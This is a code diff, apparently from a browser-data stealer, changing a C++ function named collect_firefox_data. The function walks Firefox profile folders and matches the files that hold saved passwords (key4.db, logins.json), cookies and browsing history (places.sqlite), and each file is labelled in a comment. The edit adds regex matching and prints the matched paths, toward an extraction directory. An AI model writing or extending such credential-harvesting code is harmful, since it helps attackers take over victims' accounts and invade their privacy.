@@ -102,16 +102,20 @@ void collect_firefox_data() {
 	std::string path_to_appdata = get_local_appdata_path();
 	if (path_to_extraction_directory != "" && path_to_appdata != "") {
 		std::string path_to_profiles = path_to_appdata + "\\Mozilla\\Firefox\\Profiles";
-		std::vector<std::string> important_files_regex = {
-			"\\places.sqlite$",		// Contains bookmarks, names of downloaded files, and websites visited
-			"\\key4.db$",			// Passwords
-			"\\logins.json$",		// Passwords
-			"\\cookies.sqlite$",	// Stored cookies
+		std::vector<std::regex> regex_list = {
+			std::regex("(.*)places.sqlite$"),		// Contains bookmarks, names of downloaded files, and websites visted
+			std::regex("(.*)key4.db$"),			// Passwords
+			std::regex("(.*)logins.json$"),		// Passwords
+			std::regex("(.*)cookies.sqlite$"),		// Stored cookies
 		};
 
 		for (const auto& profile_path : fs::directory_iterator(path_to_profiles)) {
 			for (const auto& item : fs::directory_iterator(profile_path.path().string())) {
-				std::cout << item.path().string() << std::endl;
+				for (std::regex i : regex_list) {
+					if (std::regex_match(item.path().string(), i)) {
+						std::cout << item.path().string() << std::endl;
+					}
+				}
 			}
 		}
 	}
